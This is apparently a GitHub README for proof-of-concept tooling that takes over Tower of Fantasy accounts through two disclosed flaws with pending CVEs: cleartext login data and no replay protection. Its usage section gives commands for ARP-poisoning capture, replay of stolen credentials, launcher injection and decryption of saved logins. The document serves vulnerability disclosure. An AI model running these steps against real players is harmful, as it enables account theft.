# ToF Account Takeover PoC

Proof-of-concept tooling for two zero-day vulnerabilities discovered in [Tower of Fantasy](https://www.toweroffantasy-global.com/en-us/index.html) by Perfect World / Hotta Studio.

These vulnerabilities were originally discovered in [Neverness to Everness (NTE)](https://nte.perfectworld.com/en/), Hotta Studio's newest game. Tower of Fantasy shares the same underlying authentication implementation, making it vulnerable to the same issues. The NTE writeup can be found [here](https://hunio.org/security/nte-account-takeover/), with the original PoC tooling located [here](https://github.com/1hunio/nte-account-takeover).

The following CVEs are pending for Tower of Fantasy:

- **CVE Pending:** Cleartext Transmission of Sensitive Information (CWE-319)
- **CVE Pending:** Insufficient Session Expiration (CWE-613)

For the full details, read my blogpost [here](https://hunio.org/security/tof-account-takeover)!

## Overview

Tower of Fantasy transmits authentication data in plaintext over TCP port `30031` using [Google FlatBuffers](https://flatbuffers.dev/). The authentication data includes a User ID and User Secret that lack any form of replay protection.

An attacker on the same network as a victim can perform a man-in-the-middle attack via ARP poisoning to capture this data and replay it from any system at any time.

## Demo video

https://github.com/user-attachments/assets/dee54e39-a0a1-4763-ac74-f117e2650077

## Requirements

- Python 3.10+
- `arpspoof` (from `dsniff`)
- `tshark` (from `wireshark`)

```
sudo apt install dsniff wireshark-common
```

## Usage

### Capture authentication data via ARP poisoning
```
sudo python3 poc.py mitm -i eth0 -t <VICTIM_IP> -g <GATEWAY_IP>
```

### Decode a captured FlatBuffers blob
```
python3 poc.py decode <CAPTURED_BLOB_HEX>
```

### Replay captured authentication data
```
python3 poc.py auth <CAPTURED_BLOB_HEX>
```

### Inject captured credentials into the launcher (Windows)
```
.\inject.ps1 <CAPTURED_BLOB_HEX> <TOWER_OF_FANTASY_INSTALL_PATH>
```

### Decrypt saved login entries (Windows)
```
.\decrypt_player.ps1 <TOWER_OF_FANTASY_INSTALL_PATH>
```
